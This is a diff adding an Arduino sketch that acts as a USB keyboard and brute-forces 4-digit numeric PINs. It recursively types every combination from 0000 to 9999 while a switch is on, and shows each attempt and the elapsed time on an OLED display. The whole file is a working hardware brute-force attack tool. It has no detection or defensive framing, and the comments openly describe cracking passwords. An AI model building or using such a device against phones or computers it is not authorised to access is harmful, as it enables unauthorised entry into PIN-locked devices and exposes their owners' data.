@@ -1,0 +1,95 @@
+#include "U8glib.h"
+#include "Keyboard.h"
+#include <EEPROM.h> // Include EEPROM library
+
+U8GLIB_SSD1306_128X64 u8g(U8G_I2C_OPT_DEV_0); // Specify the correct I2C address if needed
+
+// Define the pin for the switch input
+int switchPin = 7;
+int switchState = 0;
+
+// Define the character set for the password
+char charset_main[] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
+int len = sizeof(charset_main) / sizeof(char);
+
+unsigned long startTime = 0; // Variable to store the start time
+
+// Function to display text on OLED
+void displayText(String text, unsigned long timeTaken) {
+  u8g.firstPage();
+  do {
+    u8g.setFont(u8g_font_unifont);
+    u8g.drawStr(0, 22, text.c_str());
+    u8g.setFont(u8g_font_profont15); // Change font size for time taken
+    u8g.setCursorPos(0, 40); // Corrected function call to set cursor position
+    u8g.print("Time: ");
+    u8g.print(timeTaken);
+    u8g.print(" seconds");
+  } while (u8g.nextPage());
+}
+
+// Function to perform brute-force attack
+void bruteforce(char charset[], String prev, int len, int n) {
+  while (digitalRead(switchPin) == LOW) {
+    // Wait until the switch is turned on
+  }
+
+  if (n == 0) {
+    // If the password length is reached, type the password
+    Keyboard.println(prev);
+    delay(100); // Delay to ensure the password is processed
+
+    unsigned long endTime = millis(); // Stop measuring time
+    unsigned long elapsedTime = (endTime - startTime) / 1000; // Convert milliseconds to seconds
+
+    // Print the time taken to crack the password
+    Serial.print("Time taken to crack the password: ");
+    Serial.print(elapsedTime);
+    Serial.println(" seconds");
+
+    displayText(prev, elapsedTime); // Display the current attempt and time taken
+    return;
+  }
+
+  // Recursive call to generate all possible combinations
+  for (int i = 0; i < len; i++) {
+    String newPrev = prev + charset[i];
+    bruteforce(charset, newPrev, len, n - 1);
+  }
+}
+
+void setup() {
+  u8g.setColorIndex(1); // Set color index for monochrome display
+  u8g.setFont(u8g_font_unifont);
+  Keyboard.begin();
+  pinMode(switchPin, INPUT);
+  Serial.begin(9600); // Initialize serial communication for debugging
+
+  // Read the start time from EEPROM
+  EEPROM.get(0, startTime);
+}
+
+void loop() {
+  switchState = digitalRead(switchPin);
+
+  if (switchState == HIGH) {
+    // Define the password length
+    int passwordLength = 4;
+
+    // Store the start time in EEPROM if it's not already set
+    if (startTime == 0) {
+      startTime = millis();
+      EEPROM.put(0, startTime);
+    }
+
+    bruteforce(charset_main, "", len, passwordLength);
+  } else if (switchState == LOW) {
+    // If the switch is off, reset the start time
+    startTime = 0;
+    EEPROM.put(0, startTime);
+  }
+}
+
+/* 
+
+ */
